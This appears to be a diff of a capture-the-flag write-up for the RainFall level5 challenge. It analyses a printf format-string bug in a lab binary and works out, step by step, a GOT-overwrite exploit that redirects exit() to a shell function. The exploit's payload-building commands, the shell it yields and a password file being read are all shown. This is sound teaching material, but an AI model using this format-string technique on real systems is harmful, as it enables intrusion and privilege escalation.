@@ -1,58 +1,174 @@
-in function n:
-|           0x080484cb      eax = dword [obj.stdin]                    
-|           0x080484d0      dword [stream] = eax                       ; FILE *stream
-|           0x080484d4      dword [size] = 0x200                       ; 512 ; int size
-|           0x080484dc      eax = [format]
-|           0x080484e2      dword [esp] = eax                          ; char *s
-|           0x080484e5      sym.imp.fgets ()                           ; char *fgets(char *s, int size, FILE *stream)
-|           0x080484ea      eax = [format]
-|           0x080484f0      dword [esp] = eax                          ; const char *format
-|           0x080484f3      sym.imp.printf ()                          ; int printf(const char *format)
-|           0x080484f8      dword [esp] = 1                            ; int status
-\           0x080484ff      sym.imp.exit ()                            ; void exit(int status)
+080484c2 <n>:
+ 80484c2:	55                   	push   ebp
+ 80484c3:	89 e5                	mov    ebp,esp
+ 80484c5:	81 ec 18 02 00 00    	sub    esp,0x218
+ 80484cb:	a1 48 98 04 08       	mov    eax,ds:0x8049848             ; stdin
+ 80484d0:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+ 80484d4:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
+ 80484db:	00 
+ 80484dc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
+ 80484e2:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
+ 80484ea:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
+ 80484f0:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
+ 80484f8:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
+ 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>
+
 
 Same as before, we read a format string for printf.
 However the function calls exit directly after having called printf.
 Also, there is the function o, which is not connected to the call graph but calls a shell for us.
 
-[Sections]
-Nm Paddr       Size Vaddr      Memsz Perms Name
-00 0x00000000     0 0x00000000     0 ---- 
-01 0x00000134    19 0x08048134    19 -r-- .interp
-02 0x00000148    32 0x08048148    32 -r-- .note.ABI_tag
-03 0x00000168    36 0x08048168    36 -r-- .note.gnu.build_id
-04 0x0000018c    36 0x0804818c    36 -r-- .gnu.hash
-05 0x000001b0   160 0x080481b0   160 -r-- .dynsym
-06 0x00000250   101 0x08048250   101 -r-- .dynstr
-07 0x000002b6    20 0x080482b6    20 -r-- .gnu.version
-08 0x000002cc    32 0x080482cc    32 -r-- .gnu.version_r
-09 0x000002ec    16 0x080482ec    16 -r-- .rel.dyn
-10 0x000002fc    56 0x080482fc    56 -r-- .rel.plt
-11 0x00000334    46 0x08048334    46 -r-x .init
-12 0x00000370   128 0x08048370   128 -r-x .plt
-13 0x000003f0   476 0x080483f0   476 -r-x .text
-14 0x000005cc    26 0x080485cc    26 -r-x .fini
-15 0x000005e8    16 0x080485e8    16 -r-- .rodata
-16 0x000005f8    68 0x080485f8    68 -r-- .eh_frame_hdr
-17 0x0000063c   252 0x0804863c   252 -r-- .eh_frame
-18 0x00000738     8 0x08049738     8 -rw- .ctors
-19 0x00000740     8 0x08049740     8 -rw- .dtors
-20 0x00000748     4 0x08049748     4 -rw- .jcr
-21 0x0000074c   200 0x0804974c   200 -rw- .dynamic
-22 0x00000814     4 0x08049814     4 -rw- .got
-23 0x00000818    40 0x08049818    40 -rw- .got.plt
-24 0x00000840     8 0x08049840     8 -rw- .data
-25 0x00000848     0 0x08049848    16 -rw- .bss
-26 0x00000848    42 0x00000000    42 ---- .comment
-27 0x00000872   252 0x00000000   252 ---- .shstrtab
-28 0x00000e20  1168 0x00000000  1168 ---- .symtab
-29 0x000012b0   601 0x00000000   601 ---- .strtab
+
+level5@RainFall:~$ objdump -h level5
+
+level5:     file format elf32-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .interp       00000013  08048134  08048134  00000134  2**0
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  1 .note.ABI-tag 00000020  08048148  08048148  00000148  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  2 .note.gnu.build-id 00000024  08048168  08048168  00000168  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  3 .gnu.hash     00000024  0804818c  0804818c  0000018c  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  4 .dynsym       000000a0  080481b0  080481b0  000001b0  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  5 .dynstr       00000065  08048250  08048250  00000250  2**0
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  6 .gnu.version  00000014  080482b6  080482b6  000002b6  2**1
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  7 .gnu.version_r 00000020  080482cc  080482cc  000002cc  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  8 .rel.dyn      00000010  080482ec  080482ec  000002ec  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  9 .rel.plt      00000038  080482fc  080482fc  000002fc  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 10 .init         0000002e  08048334  08048334  00000334  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 11 .plt          00000080  08048370  08048370  00000370  2**4
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 12 .text         000001dc  080483f0  080483f0  000003f0  2**4
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 13 .fini         0000001a  080485cc  080485cc  000005cc  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 14 .rodata       00000010  080485e8  080485e8  000005e8  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 15 .eh_frame_hdr 00000044  080485f8  080485f8  000005f8  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 16 .eh_frame     000000fc  0804863c  0804863c  0000063c  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 17 .ctors        00000008  08049738  08049738  00000738  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 18 .dtors        00000008  08049740  08049740  00000740  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 19 .jcr          00000004  08049748  08049748  00000748  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 20 .dynamic      000000c8  0804974c  0804974c  0000074c  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 21 .got          00000004  08049814  08049814  00000814  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 22 .got.plt      00000028  08049818  08049818  00000818  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 23 .data         00000008  08049840  08049840  00000840  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 24 .bss          00000010  08049848  08049848  00000848  2**2
+                  ALLOC
+ 25 .comment      0000002a  00000000  00000000  00000848  2**0
+                  CONTENTS, READONLY
+
 
 We can see that the GOT (global offset table) is read-write.
+When calling exit(), in fact, the program jumps to the corresponding entry in the plt:
+080483d0 <exit@plt>:
+ 80483d0:	ff 25 38 98 04 08    	jmp    DWORD PTR ds:0x8049838
+ 80483d6:	68 28 00 00 00       	push   0x28
+ 80483db:	e9 90 ff ff ff       	jmp    8048370 <.plt>
+
+And immediately tries to jump at 0x8049838:
+Disassembly of section .got.plt:
+
+08049818 <_GLOBAL_OFFSET_TABLE_>:
+ 8049818:	4c                   	dec    esp
+ 8049819:	97                   	xchg   edi,eax
+ 804981a:	04 08                	add    al,0x8
+	...
+ 8049824:	86 83 04 08 96 83    	xchg   BYTE PTR [ebx-0x7c69f7fc],al
+ 804982a:	04 08                	add    al,0x8
+ 804982c:	a6                   	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
+ 804982d:	83 04 08 b6          	add    DWORD PTR [eax+ecx*1],0xffffffb6
+ 8049831:	83 04 08 c6          	add    DWORD PTR [eax+ecx*1],0xffffffc6
+ 8049835:	83 04 08 d6          	add    DWORD PTR [eax+ecx*1],0xffffffd6
+ 8049839:	83 04 08 e6          	add    DWORD PTR [eax+ecx*1],0xffffffe6
+ 804983d:	83                   	.byte 0x83
+ 804983e:	04 08                	add    al,0x8
+
+Which is in the global offset table, and writable.
 Which means that we can modify it to point to the function o using a %n printf exploit.
-So we are going to write into the GOT entry for exit (at 0x08049838) to replace it for the address of the function o.
-Same as before, we use two %n to write the our desired address in order not to print (53-21)*12^23 chars.
-we wrote a script to generate our input file:
-./gen.sh && cat test - | ./level05
-we've got a SUID shell.
+So we are going to write into the GOT entry for exit (at 0x08049838) to replace it with the address of the function o which is 0x080484a4.
+Same as before, we use two %n to write our desired address in order not to print (53-21)*(12^23) chars.
+There are 16 bytes between the top of the stack and the start of our format string buffer. We need to skip pop 3 arguments to align the variadic argument list with the start of the buffer.
+
+We divide the address of o, that is 0x080484a4, into two unsigned shorts: 0x84a4 and 0x0804
+level5@RainFall:~$ bc 
+bc 1.06.95
+Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.
+This is free software with ABSOLUTELY NO WARRANTY.
+For details type `warranty'. 
+obase=10
+ibase=16
+84A4
+33956
+0804
+2052
+
+So 0x84a4 = 33956 and 0x0804 = 2052
+Once again 2052 < 33956 and by the time we'll have printed 0x84a4 chars, we won't be able to simply write 0x0804 into memory.
+However since we'll write 0x0804 at the 2 high value bytes of got entry of o, it implies that whatever is written after it is not taken into account. Meaning that if we write to memory a number of this form : 0xXXXX0804, we'll be fine. For example, 0x10804 would work:
+bc 1.07.1
+Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006, 2008, 2012-2017 Free Software Foundation, Inc.
+This is free software with ABSOLUTELY NO WARRANTY.
+For details type `warranty'. 
+obase=10
+ibase=16
+10804
+67588
+
+so 0x10804 = 67588 > 33956.
+To make it simple we'll pop all the arguments we can before printing all that padding, calculating how many chars have been printed so far, without the padding:
+/bin/echo -ne '\xAA\xAA\xAA\xAA' > /tmp/input # that's the argument of the first %d conversion  
+/bin/echo -ne '\x38\x98\x04\x08' >> /tmp/input # that's the argument of the first %n conversion 
+/bin/echo -ne '\xAA\xAA\xAA\xAA' >> /tmp/input # that's the argument of the second %d conversion
+/bin/echo -ne '\x3a\x98\x04\x08' >> /tmp/input # that's the argument of the second %n conversion
+python -c 'import sys; sys.stdout.write("%p" * 3)' >> /tmp/input
+cat /tmp/input | ./level5 | wc -c 
+41
+
+41 chars have been printed: 33956 - 41 = 33915
+We need to print 33915 chars of padding, popping the first argument from the buffer without writing to memory to prevent a crash:
+/bin/echo -ne '\xAA\xAA\xAA\xAA' > /tmp/input # that's the argument of the first %d conversion  
+/bin/echo -ne '\x38\x98\x04\x08' >> /tmp/input # that's the argument of the first %n conversion 
+/bin/echo -ne '\xAA\xAA\xAA\xAA' >> /tmp/input # that's the argument of the second %d conversion
+/bin/echo -ne '\x3a\x98\x04\x08' >> /tmp/input # that's the argument of the second %n conversion
+python -c 'import sys; sys.stdout.write("%p" * 3); sys.stdout.write("%33915d")' >> /tmp/input
+cat /tmp/input | ./level5 | wc -c 
+33956 # And indeed that's the correct number of bytes printed
+
+Now we need 67588 chars printed: 67588 - 33956 = 33632
+We need to print 33632 chars of padding, popping the third argument from the buffer, and write to memory (second and fourth), to get our SUID shell:
+/bin/echo -ne '\xAA\xAA\xAA\xAA' > /tmp/input # that's the argument of the first %d conversion  
+/bin/echo -ne '\x38\x98\x04\x08' >> /tmp/input # that's the argument of the first %n conversion 
+/bin/echo -ne '\xAA\xAA\xAA\xAA' >> /tmp/input # that's the argument of the second %d conversion
+/bin/echo -ne '\x3a\x98\x04\x08' >> /tmp/input # that's the argument of the second %n conversion
+python -c 'import sys; sys.stdout.write("%p" * 3); sys.stdout.write("%33915d%n%33632d%n\n")' >> /tmp/input
+cat /tmp/input - | ./level5
+[Removed for readability]
+                                                                                                                                                                                                                                       -1431655766
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
